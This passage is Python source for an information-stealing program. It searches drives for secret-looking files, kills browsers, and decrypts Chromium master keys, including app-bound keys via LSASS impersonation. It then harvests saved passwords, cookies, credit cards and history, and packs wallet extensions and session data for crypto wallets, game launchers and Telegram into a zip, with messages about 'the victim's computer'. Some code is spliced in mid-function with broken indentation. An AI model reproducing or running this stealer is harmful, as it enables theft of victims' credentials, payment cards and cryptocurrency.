            "senha",
            "senhas",
            "data",
            "donnée",
            "donnee",
            "donnees",
            "details",
            "confidential",
            "confidentiel",
            "sensitive",
            "sensible",
            "important",
            "privilege",
            "privilège",
            "vault",
            "safe",
            "locker",
            "protection",
            "hidden",
            "caché",
            "cache",
            "identity",
            "identité",
            "passport",
            "passeport",
            "permis",
            "pin",
            "nip",
            "leak",
            "dump",
            "exposed",
            "hack",
            "crack",
            "pirate",
            "piratage",
            "breach",
            "faille",
            "db",
            "databasemaster",
            "admin",
            "administrator",
            "administrateur",
            "root",
            "owner",
            "propriétaire",
            "proprietaire",
            "keyfile",
            "keystore",
            "seedphrase",
            "recoveryphrase",
            "privatekey",
            "publickey",
            "accountdata",
            "userdata",
            "logininfo",
            "seedbackup",
            "backup",
            "dados",
            "documento",
            "documentos",
            "WhatsApp",
            "whatsapp",
            "Telegram",
            "telegram",
        ]

        name_files = []

        for path in paths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    try:
                        if file.lower().endswith(extensions):
                            file_name_no_ext = os.path.splitext(file)[0].lower()
                            for keyword in keywords:
                                try:
                                    if keyword.lower() == file_name_no_ext:
                                        full_path = os.path.join(root, file)
                                        if os.path.exists(full_path):
                                            name_files.append(file)
                                            base_name, ext = os.path.splitext(file)
                                            with open(full_path, "rb") as f:
                                                zip_file.writestr(
                                                    os.path.join(
                                                        "Interesting Files",
                                                        base_name
                                                        + f"_{random.randint(1, 9999)}"
                                                        + ext,
                                                    ),
                                                    f.read(),
                                                )
                                        break
                                except:
                                    pass
                    except:
                        pass

        if name_files:
            number_files = sum(len(phrase.split()) for phrase in name_files)
        else:
            number_files = 0

        return number_files

    @staticmethod
    def Browser_Infos(zip_file, browser_choice):
        global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
        browsers = []
        number_cards = 0
        file_cards = []
        number_cookies = 0
        file_cookies = []
        number_history = 0
        file_history = []
        number_passwords = 0
        file_passwords = []
        number_downloads = 0
        file_downloads = []
        number_extentions = 0

        path_appdata_local = Paths().appdata_local
        path_appdata_roaming = Paths().appdata_roaming

        def GetMasterKey(path):
            if not os.path.exists(path):
                return None
                
            try:
        import windows
        import windows.crypto
        from Crypto.Cipher import AES, ChaCha20_Poly1305
        return True
    except ImportError:
        return False
        


    def _impersonate_lsass():
        """Impersonate lsass.exe for SYSTEM DPAPI context."""
        import windows
        import windows.generated_def as gdef
        
        original_token = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege("SeDebugPrivilege")
            proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
            lsass_token = proc.token
            impersonation_token = lsass_token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation
            )
            windows.current_thread.token = impersonation_token
            yield
        finally:
            windows.current_thread.token = original_token

def _parse_key_blob(blob_data: bytes) -> dict:
    """Parse v20 key blob. Flag 0=raw key (Edge/Brave), 1=AES, 2=ChaCha20, 3=NCrypt+XOR"""
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    
    # Check if this is a raw 32-byte key (Edge, Brave format)
    if content_len == 32:
        # The entire content is the raw key - no flag parsing needed
        raw_key = buffer.read(32)
        parsed_data['flag'] = 0  # Special flag for raw key
        parsed_data['raw_key'] = raw_key
        return parsed_data
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported v20 flag: {parsed_data['flag']}")

    return parsed_data


def _decrypt_with_cng(input_data: bytes, key_name: str = "Google Chromekey1") -> bytes:
    import windows.generated_def as gdef
    
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    
    status = ncrypt.NCryptOpenStorageProvider(
        ctypes.byref(hProvider), 
        "Microsoft Software Key Storage Provider", 0
    )
    if status != 0:
        raise DecryptionFailed(f"NCryptOpenStorageProvider failed: {status}")

    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        ncrypt.NCryptFreeObject(hProvider)
        raise DecryptionFailed(f"NCryptOpenKey failed: {status}")

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None,
        None, 0, ctypes.byref(pcbResult), 0x40
    )
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        raise DecryptionFailed(f"NCryptDecrypt size query failed: {status}")

    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None,
        output_buffer, pcbResult.value, ctypes.byref(pcbResult), 0x40
    )
    
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    
    if status != 0:
        raise DecryptionFailed(f"NCryptDecrypt failed: {status}")

    return bytes(output_buffer[:pcbResult.value])


def _derive_v20_master_key(parsed_data: dict, browser_name: str = "chrome") -> bytes:
    """Derive v20 master key based on flag type."""
    from Crypto.Cipher import AES, ChaCha20_Poly1305
    cng_key_names = {
        "chrome": "Google Chromekey1",
        "edge": "Microsoft Edgekey1",
        "brave": "Brave Softwarekey1",
    }
    
    if parsed_data['flag'] == 0:
        # Raw key format (Edge, Brave) - key is already decrypted
        return parsed_data['raw_key']
    
    if parsed_data['flag'] == 1:
        # AES-GCM with hardcoded key
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        
    elif parsed_data['flag'] == 2:
        # ChaCha20-Poly1305 with hardcoded key
        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        
    elif parsed_data['flag'] == 3:
        # NCrypt + XOR + AES-GCM
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        key_name = cng_key_names.get(browser_name.lower(), "Google Chromekey1")
        
        with _impersonate_lsass():
            decrypted_aes_key = _decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
        
        xored_key = bytes([a ^ b for a, b in zip(decrypted_aes_key, xor_key)])
        cipher = AES.new(xored_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    
    raise DecryptionFailed(f"Unknown v20 flag: {parsed_data['flag']}")


def get_v20_key_admin(user_data_dir: Path, browser_name: str = "chrome") -> Optional[bytes]:
    """Get v20 key using admin privileges + LSASS impersonation."""
    import windows
    import windows.crypto
    
    # Check cache first
    cache_key = f"{user_data_dir}:{browser_name}"
    if cache_key in _v20_key_cache:
        return _v20_key_cache[cache_key]
    
    local_state_path = user_data_dir / "Local State"
    if not local_state_path.exists():
        return None
    
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        app_bound_key_b64 = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_key_b64:
            return None
        
        key_blob_encrypted = base64.b64decode(app_bound_key_b64)
        if key_blob_encrypted[:4] != b"APPB":
            return None
        
        key_blob_encrypted = key_blob_encrypted[4:]
        
        # Step 1: Decrypt with SYSTEM DPAPI (via LSASS impersonation)
        with _impersonate_lsass():
            key_blob_system = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        
        # Step 2: Decrypt with User DPAPI
        key_blob_user = windows.crypto.dpapi.unprotect(key_blob_system)
        
        # Step 3: Parse and derive the master key
        parsed_data = _parse_key_blob(key_blob_user)
        master_key = _derive_v20_master_key(parsed_data, browser_name)
        
        # Cache the key
        _v20_key_cache[cache_key] = master_key
        
        return master_key
    except Exception:
        return None

        def GetPasswords(browser, profile_path, master_key):
            global number_passwords
            password_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(password_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(password_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url = f"- Url      : {row[0]}"
                username = f"  Username : {row[1]}"
                password = f"  Password : {Decrypt(row[2], master_key)}"
                browser_name = f"  Browser  : {browser}"
                file_passwords.append(
                    f"{url}\n{username}\n{password}\n{browser_name}\n"
                )
                number_passwords += 1

            conn.close()

        def GetCookies(browser, profile_path, master_key):
            global number_cookies
            cookie_db = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookie_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(cookie_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute(
                "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
            )

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url = f"- Url     : {row[0]}"
                name = f"  Name    : {row[1]}"
                path = f"  Path    : {row[2]}"
                cookie = f"  Cookie  : {Decrypt(row[3], master_key)}"
                expire = f"  Expire  : {row[4]}"
                browser_name = f"  Browser : {browser}"
                file_cookies.append(
                    f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n{browser_name}\n"
                )
                number_cookies += 1

            conn.close()

        def GetHistory(browser, profile_path):
            global number_history
            history_db = os.path.join(profile_path, "History")
            if not os.path.exists(history_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(history_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url = f"- Url     : {row[0]}"
                title = f"  Title   : {row[1]}"
                time = f"  Time    : {row[2]}"
                browser_name = f"  Browser : {browser}"
                file_history.append(f"{url}\n{title}\n{time}\n{browser_name}\n")
                number_history += 1

            conn.close()

        def GetDownloads(browser, profile_path):
            global number_downloads
            downloads_db = os.path.join(profile_path, "History")
            if not os.path.exists(downloads_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(downloads_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute("SELECT tab_url, target_path FROM downloads")
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                path = f"- Path    : {row[1]}"
                url = f"  Url     : {row[0]}"
                browser_name = f"  Browser : {browser}"
                file_downloads.append(f"{path}\n{url}\n{browser_name}\n")
                number_downloads += 1

            conn.close()

        def GetCards(browser, profile_path, master_key):
            global number_cards
            cards_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(cards_db):
                return

            conn = sqlite3.connect(":memory:")
            disk_conn = sqlite3.connect(cards_db)
            disk_conn.backup(conn)
            disk_conn.close()
            cursor = conn.cursor()
            cursor.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards"
            )

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                name = f"- Name             : {row[0]}"
                expiration_month = f"  Expiration Month : {row[1]}"
                expiration_year = f"  Expiration Year  : {row[2]}"
                card_number = f"  Card Number      : {Decrypt(row[3], master_key)}"
                date_modified = f"  Date Modified    : {row[4]}"
                browser_name = f"  Browser          : {browser}"
                file_cards.append(
                    f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n{browser_name}\n"
                )
                number_cards += 1

            conn.close()

        def GetExtentions(zip_file, extensions_names, browser, profile_path):
            global number_extentions
            extensions_path = os.path.join(profile_path, "Extensions")
            zip_folder = os.path.join("Extensions", browser)

            if not os.path.exists(extensions_path):
                return

            extentions = [
                item
                for item in os.listdir(extensions_path)
                if os.path.isdir(os.path.join(extensions_path, item))
            ]

            for extention in extentions:
                if "Temp" in extention:
                    continue

                number_extentions += 1
                extension_found = False

                for extension_name, extension_folder in extensions_names:
                    if extention == extension_folder:
                        extension_found = True

                        extension_folder_path = os.path.join(
                            zip_folder, extension_name, extention
                        )

                        source_extension_path = os.path.join(extensions_path, extention)
                        for item in os.listdir(source_extension_path):
                            item_path = os.path.join(source_extension_path, item)

                            if os.path.isdir(item_path):
                                for dirpath, dirnames, filenames in os.walk(item_path):
                                    for filename in filenames:
                                        file_path = os.path.join(dirpath, filename)
                                        arcname = os.path.relpath(
                                            file_path, source_extension_path
                                        )
                                        zip_file.write(
                                            file_path,
                                            os.path.join(
                                                extension_folder_path, arcname
                                            ),
                                        )
                            else:
                                zip_file.write(
                                    item_path,
                                    os.path.join(extension_folder_path, item),
                                )
                        break

                if not extension_found:
                    other_folder_path = os.path.join(
                        zip_folder, "Unknown Extension", extention
                    )

                    source_extension_path = os.path.join(extensions_path, extention)
                    for item in os.listdir(source_extension_path):
                        item_path = os.path.join(source_extension_path, item)

                        if os.path.isdir(item_path):
                            for dirpath, dirnames, filenames in os.walk(item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(
                                        file_path, source_extension_path
                                    )
                                    zip_file.write(
                                        file_path,
                                        os.path.join(other_folder_path, arcname),
                                    )
                        else:
                            zip_file.write(
                                item_path, os.path.join(other_folder_path, item)
                            )

        browser_files = [
            (
                "Google Chrome",
                os.path.join(path_appdata_local, "Google", "Chrome", "User Data"),
                "chrome.exe",
            ),
            (
                "Chromiums",
                os.path.join(path_appdata_local, "Google", "Chromium", "User Data"),
                "chrome.exe",
            ),
            (
                "Chromium",
                os.path.join(path_appdata_local, "Chromium", "User Data"),
                "chrome.exe",
            ),
            (
                "Google Chrome SxS",
                os.path.join(path_appdata_local, "Google", "Chrome SxS", "User Data"),
                "chrome.exe",
            ),
            (
                "Google Chrome Beta",
                os.path.join(path_appdata_local, "Google", "Chrome Beta", "User Data"),
                "chrome.exe",
            ),
            (
                "Google Chrome Dev",
                os.path.join(path_appdata_local, "Google", "Chrome Dev", "User Data"),
                "chrome.exe",
            ),
            (
                "Google Chrome Unstable",
                os.path.join(
                    path_appdata_local, "Google", "Chrome Unstable", "User Data"
                ),
                "chrome.exe",
            ),
            (
                "Google Chrome Canary",
                os.path.join(
                    path_appdata_local, "Google", "Chrome Canary", "User Data"
                ),
                "chrome.exe",
            ),
            (
                "Microsoft Edge",
                os.path.join(path_appdata_local, "Microsoft", "Edge", "User Data"),
                "msedge.exe",
            ),
            (
                "Opera",
                os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"),
                "opera.exe",
            ),
            (
                "Opera GX",
                os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"),
                "opera.exe",
            ),
            (
                "Opera Neon",
                os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"),
                "opera.exe",
            ),
            (
                "Brave",
                os.path.join(
                    path_appdata_local,
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                ),
                "brave.exe",
            ),
            (
                "Vivaldi",
                os.path.join(path_appdata_local, "Vivaldi", "User Data"),
                "vivaldi.exe",
            ),
            (
                "Internet Explorer",
                os.path.join(path_appdata_local, "Microsoft", "Internet Explorer"),
                "iexplore.exe",
            ),
            (
                "Amigo",
                os.path.join(path_appdata_local, "Amigo", "User Data"),
                "amigo.exe",
            ),
            (
                "Torch",
                os.path.join(path_appdata_local, "Torch", "User Data"),
                "torch.exe",
            ),
            (
                "Kometa",
                os.path.join(path_appdata_local, "Kometa", "User Data"),
                "kometa.exe",
            ),
            (
                "Orbitum",
                os.path.join(path_appdata_local, "Orbitum", "User Data"),
                "orbitum.exe",
            ),
            (
                "Cent Browser",
                os.path.join(path_appdata_local, "CentBrowser", "User Data"),
                "centbrowser.exe",
            ),
            (
                "7Star",
                os.path.join(path_appdata_local, "7Star", "7Star", "User Data"),
                "7star.exe",
            ),
            (
                "Sputnik",
                os.path.join(path_appdata_local, "Sputnik", "Sputnik", "User Data"),
                "sputnik.exe",
            ),
            (
                "Epic Privacy Browser",
                os.path.join(path_appdata_local, "Epic Privacy Browser", "User Data"),
                "epic.exe",
            ),
            (
                "Uran",
                os.path.join(path_appdata_local, "uCozMedia", "Uran", "User Data"),
                "uran.exe",
            ),
            (
                "Yandex",
                os.path.join(
                    path_appdata_local, "Yandex", "YandexBrowser", "User Data"
                ),
                "yandex.exe",
            ),
            (
                "Yandex Canary",
                os.path.join(
                    path_appdata_local,
                    "Yandex",
                    "YandexBrowserCanary",
                    "User Data",
                ),
                "yandex.exe",
            ),
            (
                "Yandex Developer",
                os.path.join(
                    path_appdata_local,
                    "Yandex",
                    "YandexBrowserDeveloper",
                    "User Data",
                ),
                "yandex.exe",
            ),
            (
                "Yandex Beta",
                os.path.join(
                    path_appdata_local,
                    "Yandex",
                    "YandexBrowserBeta",
                    "User Data",
                ),
                "yandex.exe",
            ),
            (
                "Yandex Tech",
                os.path.join(
                    path_appdata_local,
                    "Yandex",
                    "YandexBrowserTech",
                    "User Data",
                ),
                "yandex.exe",
            ),
            (
                "Yandex SxS",
                os.path.join(
                    path_appdata_local,
                    "Yandex",
                    "YandexBrowserSxS",
                    "User Data",
                ),
                "yandex.exe",
            ),
            (
                "Iridium",
                os.path.join(path_appdata_local, "Iridium", "User Data"),
                "iridium.exe",
            ),
            (
                "Mozilla Firefox",
                os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),
                "firefox.exe",
            ),
            (
                "Safari",
                os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),
                "safari.exe",
            ),
        ]

        profiles = [
            "",
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        extensions_names = [
            ("Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            ("Metamask", "ejbalbakoplchlghecdalmeeeajnimhm"),
            ("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"),
            ("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
            ("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
            ("Trust", "egjidjbpglichdcondbcbdnbeeppgdph"),
            ("Venom", "ojggmchlghnjlapmfbnjholfjkiidbch"),
            ("Sui", "opcgpfmipidbgpenhmajoajpbobppdil"),
            ("Martian", "efbglgofoippbgcjepnhiblaibcnclgk"),
            ("Tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
            ("Petra", "ejjladinnckdgjemekebdpeokbikhfci"),
            ("Pontem", "phkbamefinggmakgklpkljjmgibohnba"),
            ("Fewcha", "ebfidpplhabeedpnhjnobghokpiioolj"),
            ("Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
            ("Coin98", "aeachknmefphepccionboohckonoeemg"),
            ("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"),
            ("ExodusWeb3", "aholpfdialjgjfhomihkjbmgjidlcdno"),
            ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
            ("Core", "agoakfejjabomempkjlepdflaleeobhb"),
            ("Tokenpocket", "mfgccjchihfkkindfppnaooecgfneiii"),
            ("Safepal", "lgmpcpglpngdoalbgeoldeajfclnhafa"),
            ("Solfare", "bhhhlbepdkbapadjdnnojkbgioiodbic"),
            ("Kaikas", "jblndlipeogpafnldhgmapagcccfchpi"),
            ("iWallet", "kncchdigobghenbbaddojjnnaogfppfj"),
            ("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"),
            ("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
            ("Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne"),
            ("Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"),
            ("Oxygen", "fhilaheimglignddkjgofkcbgekhenbh"),
            ("MEWCX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
            ("Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj"),
            ("Saturn", "nkddgncdjgjfcddamfgcmfnlhccnimig"),
            ("TerraStation", "aiifbnbfobpmeekipheeijimdpnlpgpp"),
            ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
            ("Ever", "cgeeodpfagjceefieflmdfphplkenlfk"),
            ("KardiaChain", "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
            ("PaliWallet", "mgffkfbidihjpoaomajlbgchddlicgpn"),
            ("BoltX", "aodkkagnadcbobfpggfnjeongemjbjca"),
            ("Liquality", "kpfopkelmapcoipemfendmdcghnegimn"),
            ("XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
            ("Nami", "lpfcbjknijpeeillifnkikgncikgfhdo"),
            ("MaiarDEFI", "dngmlblcodfobpdpecaadgfbcggfjfnm"),
            ("TempleTezos", "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
            ("XMR.PT", "eigblbgjknlfbajkfhopmcojidlgcehm"),
        ]

        try:
            for name, path, proc_name in browser_files:
                for proc in psutil.process_iter(["pid", "name"]):
                    try:
                        if proc.name().lower() == proc_name.lower():
                            proc.kill()
                    except:
                        pass
        except:
            pass

        for name, path, proc_name in browser_files:
            if not os.path.exists(path):
                continue

            master_key = GetMasterKey(os.path.join(path, "Local State"))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                if "extentions" in browser_choice:
                    try:
                        GetExtentions(zip_file, extensions_names, name, profile_path)
                    except:
                        pass

                if "passwords" in browser_choice:
                    try:
                        GetPasswords(name, profile_path, master_key)
                    except:
                        pass

                if "cookies" in browser_choice:
                    try:
                        GetCookies(name, profile_path, master_key)
                    except:
                        pass

                if "history" in browser_choice:
                    try:
                        GetHistory(name, profile_path)
                    except:
                        pass

                if "downloads" in browser_choice:
                    try:
                        GetDownloads(name, profile_path)
                    except:
                        pass

                if "cards" in browser_choice:
                    try:
                        GetCards(name, profile_path, master_key)
                    except:
                        pass

                if name not in browsers:
                    browsers.append(name)

        if "passwords" in browser_choice:
            if not file_passwords:
                file_passwords.append(
                    "No passwords was saved on the victim's computer."
                )
            file_passwords = "\n".join(file_passwords)

        if "cookies" in browser_choice:
            if not file_cookies:
                file_cookies.append("No cookies was saved on the victim's computer.")
            file_cookies = "\n".join(file_cookies)

        if "history" in browser_choice:
            if not file_history:
                file_history.append("No history was saved on the victim's computer.")
            file_history = "\n".join(file_history)

        if "downloads" in browser_choice:
            if not file_downloads:
                file_downloads.append(
                    "No downloads was saved on the victim's computer."
                )
            file_downloads = "\n".join(file_downloads)

        if "cards" in browser_choice:
            if not file_cards:
                file_cards.append("No cards was saved on the victim's computer.")
            file_cards = "\n".join(file_cards)

        if number_passwords is not None:
            zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)

        if number_cookies is not None:
            zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)

        if number_cards is not None:
            zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)

        if number_history is not None:
            zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)

        if number_downloads is not None:
            zip_file.writestr(
                f"Download History ({number_downloads}).txt", file_downloads
            )

        return (
            number_extentions,
            number_passwords,
            number_cookies,
            number_history,
            number_downloads,
            number_cards,
        )

    @staticmethod
    def Session_files(zip_file, session_files_choice):
        path_appdata_roaming = Paths().appdata_roaming
        path_appdata_local = Paths().appdata_local
        path_program_files = Paths().program_files

        name_game_launchers = [] if "Game Launchers" in session_files_choice else None
        name_wallets = [] if "Wallets" in session_files_choice else None
        name_apps = [] if "Apps" in session_files_choice else None

        session_files = [
            (
                "Zcash",
                os.path.join(path_appdata_roaming, "Zcash"),
                "zcash.exe",
                "Wallets",
            ),
            (
                "Armory",
                os.path.join(path_appdata_roaming, "Armory"),
                "armory.exe",
                "Wallets",
            ),
            (
                "Bytecoin",
                os.path.join(path_appdata_roaming, "bytecoin"),
                "bytecoin.exe",
                "Wallets",
            ),
            (
                "Guarda",
                os.path.join(
                    path_appdata_roaming, "Guarda", "Local Storage", "leveldb"
                ),
                "guarda.exe",
                "Wallets",
            ),
            (
                "Atomic Wallet",
                os.path.join(
                    path_appdata_roaming, "atomic", "Local Storage", "leveldb"
                ),
                "atomic.exe",
                "Wallets",
            ),
            (
                "Exodus",
                os.path.join(path_appdata_roaming, "Exodus", "exodus.wallet"),
                "exodus.exe",
                "Wallets",
            ),
            (
                "Binance",
                os.path.join(
                    path_appdata_roaming, "Binance", "Local Storage", "leveldb"
                ),
                "binance.exe",
                "Wallets",
            ),
            (
                "Jaxx Liberty",
                os.path.join(
                    path_appdata_roaming,
                    "com.liberty.jaxx",
                    "IndexedDB",
                    "file__0.indexeddb.leveldb",
                ),
                "jaxx.exe",
                "Wallets",
            ),
            (
                "Electrum",
                os.path.join(path_appdata_roaming, "Electrum", "wallets"),
                "electrum.exe",
                "Wallets",
            ),
            (
                "Coinomi",
                os.path.join(path_appdata_roaming, "Coinomi", "Coinomi", "wallets"),
                "coinomi.exe",
                "Wallets",
            ),
            (
                "Trust Wallet",
                os.path.join(path_appdata_roaming, "Trust Wallet"),
                "trustwallet.exe",
                "Wallets",
            ),
            (
                "AtomicDEX",
                os.path.join(path_appdata_roaming, "AtomicDEX"),
                "atomicdex.exe",
                "Wallets",
            ),
            (
                "Wasabi Wallet",
                os.path.join(path_appdata_roaming, "WalletWasabi", "Wallets"),
                "wasabi.exe",
                "Wallets",
            ),
            (
                "Ledger Live",
                os.path.join(path_appdata_roaming, "Ledger Live"),
                "ledgerlive.exe",
                "Wallets",
            ),
            (
                "Trezor Suite",
                os.path.join(path_appdata_roaming, "Trezor", "suite"),
                "trezor.exe",
                "Wallets",
            ),
            (
                "Blockchain Wallet",
                os.path.join(path_appdata_roaming, "Blockchain", "Wallet"),
                "blockchain.exe",
                "Wallets",
            ),
            (
                "Mycelium",
                os.path.join(path_appdata_roaming, "Mycelium", "Wallets"),
                "mycelium.exe",
                "Wallets",
            ),
            (
                "Crypto.com",
                os.path.join(path_appdata_roaming, "Crypto.com", "appdata"),
                "crypto.com.exe",
                "Wallets",
            ),
            (
                "BRD",
                os.path.join(path_appdata_roaming, "BRD", "wallets"),
                "brd.exe",
                "Wallets",
            ),
            (
                "Coinbase Wallet",
                os.path.join(path_appdata_roaming, "Coinbase", "Wallet"),
                "coinbase.exe",
                "Wallets",
            ),
            (
                "Zerion",
                os.path.join(path_appdata_roaming, "Zerion", "wallets"),
                "zerion.exe",
                "Wallets",
            ),
            (
                "Steam",
                os.path.join(path_program_files, "Steam", "config"),
                "steam.exe",
                "Game Launchers",
            ),
            (
                "Riot Games",
                os.path.join(path_appdata_local, "Riot Games", "Riot Client", "Data"),
                "riot.exe",
                "Game Launchers",
            ),
            (
                "Epic Games",
                os.path.join(path_appdata_local, "EpicGamesLauncher"),
                "epicgameslauncher.exe",
                "Game Launchers",
            ),
            (
                "Rockstar Games",
                os.path.join(path_appdata_local, "Rockstar Games"),
                "rockstarlauncher.exe",
                "Game Launchers",
            ),
            (
                "Telegram",
                os.path.join(path_appdata_roaming, "Telegram Desktop", "tdata"),
                "telegram.exe",
                "Apps",
            ),
        ]

        try:
            for name, path, proc_name, type in session_files:
                if type in session_files_choice:
                    for proc in psutil.process_iter(["pid", "name"]):
                        try:
                            if proc.info["name"].lower() == proc_name.lower():
                                proc.kill()
                        except:
                            pass
        except:
            pass

        for name, path, proc_name, type in session_files:
            if type in session_files_choice and os.path.exists(path):
                try:
                    if type == "Wallets" and name_wallets is not None:
                        name_wallets.append(name)
                    elif type == "Game Launchers" and name_game_launchers is not None:
                        name_game_launchers.append(name)
                    elif type == "Apps" and name_apps is not None:
                        name_apps.append(name)

                    zip_file.writestr(
                        os.path.join("Session Files", name, "path.txt"), path
                    )

                    if os.path.isdir(path):
                        for root, _, files in os.walk(path):
                            for file in files:
                                abs_file_path = os.path.join(root, file)
                                rel_path_in_zip = os.path.join(
                                    "Session Files",
                                    name,
                                    "Files",
                                    os.path.relpath(abs_file_path, path),
                                )
                                try:
                                    zip_file.write(abs_file_path, rel_path_in_zip)
                                except:
                                    pass
                    else:
                        rel_path_in_zip = os.path.join(
                            "Session Files",
                            name,
                            "Files",
                            os.path.basename(path),
                        )
                        try:
                            zip_file.write(path, rel_path_in_zip)
                        except:
                            pass
                except:
                    pass

        if "Wallets" in session_files_choice:
            name_wallets = ", ".join(name_wallets) if name_wallets else "No"
        if "Game Launchers" in session_files_choice:
            name_game_launchers = (
                ", ".join(name_game_launchers) if name_game_launchers else "No"
            )
        if "Apps" in session_files_choice:
            name_apps = ", ".join(name_apps) if name_apps else "No"

        return name_wallets, name_game_launchers, name_apps

    @staticmethod
    def Screenshot(zip_file):
        path_temp = Paths().temp
        screenshot_image_path = os.path.join(path_temp, "screenshot_capture.png")

        try:
